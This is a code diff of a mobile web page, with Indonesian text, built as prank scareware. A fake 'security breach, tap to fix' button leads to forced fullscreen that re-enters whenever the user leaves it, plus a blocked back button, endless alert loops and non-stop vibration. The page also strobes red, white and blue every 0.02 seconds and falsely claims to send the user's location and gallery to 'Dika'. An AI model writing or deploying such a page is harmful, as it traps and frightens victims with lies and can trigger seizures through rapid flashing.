@@ -3,35 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ SYSTEM OVERLOAD ⚡</title>
+    <title>!!! SYSTEM DESTROYED !!!</title>
     <style>
-        * { cursor: none; }
+        * { -webkit-tap-highlight-color: transparent; outline: none; }
         body {
             background-color: #000;
             margin: 0;
             overflow: hidden;
-            font-family: 'Arial Black', Gadget, sans-serif;
+            font-family: 'Arial Black', sans-serif;
             height: 100vh;
+            width: 100vw;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: white;
+            color: #fff;
             flex-direction: column;
+            user-select: none;
         }
 
-        #overlay-flash {
+        /* Background kedap-kedip super cepat */
+        #chaos-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             z-index: 1000;
             display: none;
-            animation: intense-flash 0.03s infinite;
+            animation: flash 0.02s infinite;
         }
 
-        @keyframes intense-flash {
-            0% { background: red; }
-            33% { background: #000; }
-            66% { background: blue; }
-            100% { background: #fff; }
+        @keyframes flash {
+            0% { background: #ff0000; }
+            50% { background: #fff; }
+            100% { background: #0000ff; }
         }
 
         .content {
@@ -41,88 +43,98 @@
             display: none;
         }
 
-        h1 { font-size: 50px; margin: 0; color: yellow; text-shadow: 5px 5px #ff0000; }
-        .sub-text { font-size: 20px; color: white; background: black; padding: 10px; }
-        
-        #start-screen {
+        h1 { font-size: 60px; margin: 0; color: #fff; text-shadow: 10px 10px #000; line-height: 1; }
+        .alert-text { font-size: 40px; background: yellow; color: red; padding: 20px; font-weight: bold; }
+
+        #start-btn {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 9999;
             background: #000;
-            z-index: 2000;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: #0f0;
-            text-align: center;
-            font-family: monospace;
+            color: #ff0000;
+            font-size: 20px;
+            cursor: pointer;
+            border: none;
         }
     </style>
 </head>
-<body onclick="launchChaos()">
+<body>
 
-    <div id="start-screen">
-        <div>
-            <p>> SYSTEM READY...</p>
-            <p style="font-size: 24px; border: 2px solid #0f0; padding: 20px;">[ TAP TO START SCAN ]</p>
-        </div>
-    </div>
+    <button id="start-btn" onclick="goCrazy()">
+        [!] SYSTEM SECURITY BREACH [!]<br>
+        TAP TO FIX ERROR
+    </button>
 
-    <div id="overlay-flash"></div>
+    <div id="chaos-overlay"></div>
 
     <div class="content" id="ui">
-        <h1>SUNGKEM KE DIKA!</h1>
-        <div class="sub-text">HARDWARE MALFUNCTION DETECTED</div>
-        <marquee scrollamount="20" style="font-size: 30px; background: yellow; color: black; font-weight: bold; margin-top: 20px;">
-            SUNGKEM KE DIKA SEKARANG! SUNGKEM KE DIKA SEKARANG! 
-        </marquee>
+        <h1>SUNGKEM<br>KE DIKA!</h1>
+        <p class="alert-text">SISTEM TERKUNCI TOTAL</p>
+        <p style="font-size: 15px;">MENGIRIM LOKASI ANDA KE DIKA...</p>
     </div>
 
     <script>
-        function launchChaos() {
-            // 1. FULLSCREEN INSTAN
+        function goFullScreen() {
             let elem = document.documentElement;
             if (elem.requestFullscreen) {
                 elem.requestFullscreen();
-            } else if (elem.webkitRequestFullscreen) { /* Safari */
+            } else if (elem.webkitRequestFullscreen) {
                 elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
             }
+        }
 
-            // 2. Sembunyikan layar awal & aktifkan visual
-            document.getElementById('start-screen').style.display = 'none';
-            document.getElementById('overlay-flash').style.display = 'block';
+        function vibrateNonStop() {
+            if (navigator.vibrate) {
+                // Getar 10 detik penuh
+                navigator.vibrate(10000);
+            }
+        }
+
+        function goCrazy() {
+            // Langsung Fullscreen
+            goFullScreen();
+
+            // Sembunyikan tombol, munculkan chaos
+            document.getElementById('start-btn').style.display = 'none';
+            document.getElementById('chaos-overlay').style.display = 'block';
             document.getElementById('ui').style.display = 'block';
 
-            // 3. GETARAN LEVEL MAX (Vibrate-Burst)
-            // Menggunakan interval pendek agar getaran bertumpuk dan tidak berhenti
-            if (navigator.vibrate) {
-                setInterval(() => {
-                    // Pola getar tanpa jeda (5 detik getar terus)
-                    navigator.vibrate([5000]); 
-                }, 100); 
-            }
+            // Getar brutal terus-menerus
+            setInterval(() => {
+                vibrateNonStop();
+            }, 1000);
 
-            // 4. KUNCI NAVIGASI BALIK
-            history.pushState(null, null, location.href);
-            window.onpopstate = function() {
-                history.go(1);
-                alert("GAK BISA KELUAR! LU HARUS SUNGKEM KE DIKA!");
-            };
-
-            // 5. SPAM ALERT & VIBRATE RE-TRIGGER
+            // Trik Fullscreen Terus: Setiap kali user klik OK di alert, masuk fullscreen lagi
             setTimeout(() => {
                 while(true) {
-                    alert("⚠️ WARNING ⚠️\n\nSISTEM ERROR!\nCEPAT SUNGKEM KE DIKA!");
-                    alert("LOG: Data Galeri dikirim ke Dika...");
-                    alert("SUNGKEM ATAU HP LU MELEDAK!");
-                    if (navigator.vibrate) navigator.vibrate(5000);
+                    goFullScreen(); // Paksa fullscreen lagi
+                    alert("⚠️ ERROR 666: SUNGKEM KE DIKA SEKARANG!");
+                    alert("MAU KELUAR? SUNGKEM DULU!");
+                    alert("HP ANDA SEDANG DIKENDALIKAN DIKA!");
+                    vibrateNonStop();
                 }
-            }, 1000);
+            }, 500);
         }
 
-        // Mencegah Inspect Element (opsional)
-        document.onkeydown = function(e) {
-            if(e.keyCode == 123) return false;
-        }
+        // Blokir tombol Back
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.go(1);
+            goFullScreen();
+            alert("AKSES DIBLOKIR! SUNGKEM KE DIKA!");
+        };
+
+        // Jika user mencoba keluar dari fullscreen (misal tekan tombol Esc di keyboard atau navigasi hp)
+        document.addEventListener("fullscreenchange", () => {
+            if (!document.fullscreenElement) {
+                goFullScreen();
+            }
+        });
     </script>
 </body>
 </html>
